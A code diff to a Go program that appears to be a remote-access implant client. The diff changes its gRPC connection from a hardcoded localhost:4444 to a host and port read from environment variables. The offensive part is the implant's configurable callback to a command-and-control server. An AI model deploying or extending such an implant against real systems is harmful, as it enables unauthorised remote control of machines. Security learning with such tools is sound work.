@@ -3,11 +3,13 @@ package main
 import (
 	"fmt"
 	"log"
+	"os"
 	"os/exec"
 	"strings"
 	"time"
 
 	"github.com/Galionme/hercules/grpcapi"
+	"github.com/joho/godotenv"
 	"golang.org/x/net/context"
 	"google.golang.org/grpc"
 )
@@ -19,8 +21,14 @@ func main() {
 		err    error
 		client grpcapi.ImplantClient
 	)
+
+	err = godotenv.Load()
+	if err != nil {
+		log.Fatal(err)
+	}
+
 	opts = append(opts, grpc.WithInsecure())
-	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
+	if conn, err = grpc.Dial(fmt.Sprintf("%s:%s", os.Getenv("IMPLANT_HOST"), os.Getenv("IMPLANT_PORT")), opts...); err != nil {
 		log.Fatal(err)
 	}
 	defer conn.Close()
